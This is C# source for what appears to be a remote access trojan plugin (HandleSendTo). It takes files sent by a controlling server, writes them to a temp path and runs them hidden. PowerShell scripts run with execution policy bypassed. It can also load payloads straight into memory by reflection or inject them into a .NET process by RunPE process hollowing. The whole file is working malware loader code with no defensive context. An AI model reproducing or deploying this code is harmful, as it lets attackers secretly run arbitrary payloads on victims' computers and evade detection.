using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Plugin.MessagePack;

namespace Plugin.Handler
{
    public class HandleSendTo
    {
        public void SendToDisk(MsgPack unpack_msgpack)
        {
            try
            {
                //Drop To Disk
                string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                File.WriteAllBytes(fullPath, Methods.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"{fullPath}\" & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                else
                    Process.Start(new ProcessStartInfo {
                        FileName = "cmd",
                        Arguments = $"/c start {fullPath} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                {
                    new HandleUninstall();
                }
                else
                {
                    Packet.Log("file executed!");
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }

        public void SendToMemory(MsgPack unpack_msgpack)
        {
            try
            {
                byte[] buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                string injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                if (injection.Length == 0)
                {
                    //Reflection
                    new Thread(delegate ()
                    {
                        try
                        {
                            Assembly loader = Assembly.Load(Methods.Decompress(buffer));
                            object[] parm = null;
                            if (loader.EntryPoint.GetParameters().Length > 0)
                            {
                                parm = new object[] { new string[] { null } };
                            }
                            loader.EntryPoint.Invoke(null, parm);
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }
                    })
                    { IsBackground = true }.Start();

                }
                else
                {
                    //RunPE
                    new Thread(delegate ()
                    {
                        try
                        {
                            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Methods.Decompress(buffer));
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }
                    })
                    { IsBackground = true }.Start();
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }
    }

}
